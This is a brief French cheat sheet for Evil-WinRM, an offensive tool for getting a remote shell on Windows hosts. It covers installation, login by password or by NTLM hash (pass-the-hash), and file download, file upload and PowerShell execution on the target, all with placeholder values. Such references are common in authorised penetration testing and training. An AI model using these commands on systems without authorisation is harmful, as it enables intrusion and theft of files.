# Evil-WinRM - Résumé et utilisation

## Présentation
Evil-WinRM est un outil permettant d'obtenir un accès interactif à une machine Windows via WinRM (Windows Remote Management).

## Installation
# Kali Linux : peut nécessiter une installation
sudo gem install evil-winrm

## Connexion à une machine cible
# Accès avec un utilisateur et un mot de passe
evil-winrm -i <IP_CIBLE> -u <USER> -p <PASSWORD>

# Accès avec un hash NTLM (Pass-The-Hash)
evil-winrm -i <IP_CIBLE> -u <USER> -H <NTLM_HASH>

## Commandes utiles une fois connecté
# Lister les fichiers du répertoire courant
dir

# Changer de répertoire
cd <Dossier>

# Télécharger un fichier depuis la machine cible
download <nom_du_fichier>

# Envoyer un fichier vers la machine cible
upload <fichier_local> <destination>

# Exécuter un script PowerShell
powershell -c "<COMMAND>"
